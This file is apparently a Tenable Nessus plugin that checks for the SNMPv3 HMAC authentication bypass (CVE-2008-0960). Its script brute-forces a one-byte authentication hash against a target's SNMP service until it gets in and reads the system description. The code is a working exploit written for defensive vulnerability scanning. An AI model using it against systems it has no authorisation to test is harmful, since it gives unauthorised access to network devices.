#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(40449);
  script_version('$Revision: 1.21 $');
  script_cvs_date("$Date: 2017/02/07 14:52:10 $");

  script_cve_id("CVE-2008-0960");
  script_bugtraq_id(29623);
  script_osvdb_id(
    46059,
    46060,
    46086,
    46088,
    46102,
    46276,
    46669,
    55248,
    98737
  );
  script_xref(name:"CERT", value:"878044");
  script_xref(name:"EDB-ID", value:"5790");

  script_name(english:"Multiple Vendor HMAC Authentication SNMPv3 Authentication Bypass");
  script_summary(english:'Makes repeated attempts to authenticate with a single character authentication hash.' );

  script_set_attribute(attribute:'synopsis', value:
"The SNMP server running on this host is affected by an authentication
bypass vulnerability.");
  script_set_attribute(attribute:'description', value:
"SNMPv3 HMAC verification relies on the client to specify the HMAC
length.  This makes it possible for remote attackers to bypass SNMP
authentication via repeated attempts with a HMAC length value of 1,
which causes only the first byte of the authentication hash to be
checked. 

This issue affects SNMP implementations from multiple vendors.");
  script_set_attribute(attribute:'see_also', value:'http://sourceforge.net/forum/forum.php?forum_id=833770');
  script_set_attribute( attribute:'solution', value:
"This vulnerability affects multiple products from multiple vendors. 
Check with your vendor for the appropriate solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:X/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(287);

  script_set_attribute(attribute:'vuln_publication_date', value:'2008/05/31');
  script_set_attribute(attribute:'patch_publication_date', value:'2008/06/09');
  script_set_attribute(attribute:'plugin_publication_date', value:'2009/07/31');

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:'SNMP');

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies('find_service2.nasl');
  script_require_keys('SNMP/v3/username', 'SNMP/v3/Supported');
  exit(0);
}

include("global_settings.inc");
include ("misc_func.inc");
include ("snmp_func.inc");

v3_supported = get_kb_item( 'SNMP/v3/Supported' );
if  ( ! v3_supported )
  exit( 0, 'SNMPv3 is not supported.' );

username = get_kb_item( 'SNMP/v3/username' );
if  ( ! username )
  exit( 1, 'No SNMPv3 username specified.' );

port = get_kb_item("SNMP/port");
if  ( !port )
    port = 161;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

function snmp_no_auth_validation_reply( socket, timeout )
{
  local_var seq, res, pdu, error, oid, ret, rep, id, cmpt, vers, tmp;
  local_var msg_flags, msg_auth_priv_params, response_data_index;

  cmpt = 5;

  while (cmpt)
  {
    rep = recv(socket:socket, length:4096, timeout:timeout);
    if (!rep)
      return NULL;

    # First decode snmp reply (sequence)
    seq = ber_get_sequence (seq:rep);

    if (isnull(seq) || (seq[0] != 4) )
      return NULL;

    tmp = ber_get_sequence( seq:seq[ 4 ] );

    # Check if Response PDU is 2
    pdu = ber_get_response_pdu( pdu:tmp[ 3 ] );

    if (isnull(pdu) || (pdu[0] != 4))
      return NULL;

    id = ber_get_int (i:pdu[1]);

    if ( !isnull(id) && ( ( id == (snmp_request_id - 1) ) || id == 0 ) )
    {
      # Check if Error == NO ERROR
      error = ber_get_int (i:pdu[2]);
      if (isnull(error) || (error != 0))
        return NULL;

      # Extract response
      seq = ber_get_sequence (seq:pdu[4]);
      if (isnull(seq) || (seq[0] != 1))
        return NULL;

      seq = ber_get_sequence (seq:seq[1]);
      if (isnull(seq) || (seq[0] != 2))
        return NULL;

      oid = ber_get_oid (oid:seq[1]);
      res = snmp_extract_reply (rep:seq[2]);

      if ( isnull( oid ) )
        return NULL;

      ret = make_list();
      ret[0] = oid;
      ret[1] = res;

      return ret;
    }
    cmpt--;
  }
}

rep = NULL;
tries = 0;

soc = open_sock_udp(port);
if ( !soc )
  exit ( 1, 'Socket failure.' );

# Set the common values
set_snmp_version( version:3 );
msg_id = rand();

# Get the authoritative engine ID
if( ( ! auth_engine_id ) || ( ! auth_engine_boots  ) || ( !  auth_engine_time  ) )
{
  msg_flags = raw_string( MSG_REPORTABLE_FLAG );
  msg_global_data = snmpv3_put_msg_global_data( msg_max_size:MSG_MAX_SIZE,
                                                msg_flags:msg_flags,
                                                msg_security_model:USM_SECURITY_MODEL );
  snmpv3_connected = snmpv3_initial_request( socket:soc, msg_global_data:msg_global_data, timeout:2 );
  if ( ! snmpv3_connected )
    exit(1, "SNMPv3 request failed");
}

# Set the static parts of the auth attempt
packed_version = ber_put_int( i:SNMP_VERSION );
msg_flags = raw_string( MSG_REPORTABLE_FLAG | MSG_AUTHENTICATED_FLAG );
auth_data = snmp_assemble_authentication_data( auth_engine_data:snmp_put_engine_data(),
                                                                msg_user_name:username,
                                                                msg_auth_param:'T',
                                                                msg_priv_param:NULL );

# Construct request for SysDesc OID.
sequence = ber_put_sequence( seq:make_list( ber_put_oid( oid:'1.3.6.1.2.1.1.1.0' ), ber_put_null() ) );

while( tries < 512 )
{
  tries++;
  msg_global_data = snmpv3_put_msg_global_data( msg_max_size:MSG_MAX_SIZE,
                                                msg_flags:msg_flags,
                                                msg_security_model:USM_SECURITY_MODEL );
  snmp_header = raw_string( packed_version, msg_global_data, auth_data );
  req = snmp_assemble_request_data( seq:sequence, op:OP_GET_REQUEST );
  whole_msg = ber_put_sequence( seq:make_list( snmp_header, req ) );

  send( socket:soc, data:whole_msg );
  rep = snmp_no_auth_validation_reply( socket:soc, timeout:2 );

  if  ( isnull( rep ) )
    exit( 1, 'Unexpected response.' );
  else if ( rep[ 0 ] == USM_STATS_WRONG_DIGESTS )
    continue;
  else if ( rep[ 0 ] == USM_STATS_UNKNOWN_USER_NAMES )
    exit( 0, 'Not a valid SNMPv3 username for this host' );
  else if ( rep[ 0 ] == '1.3.6.1.2.1.1.1.0' )
    break;
  else
    exit( 1, 'Unexpected response.' );
}

reset_snmp_version();

if  ( rep[ 0 ] == '1.3.6.1.2.1.1.1.0' )
{
  if  ( report_verbosity > 0 )
  {
    report = string(
      '\n',
      'Nessus was able to force authorized access after ', tries, ' attempts.\n\n',
      'The request for the system description returned :\n',
      '\n',
      rep[ 1 ],'\n'
    );

    security_hole( port:port, proto:'udp', extra:report );
  }
  else security_hole( port:port, proto:'udp' );
}
else
  exit( 0, 'Nessus couldn\'t find any vulnerable installs.' );
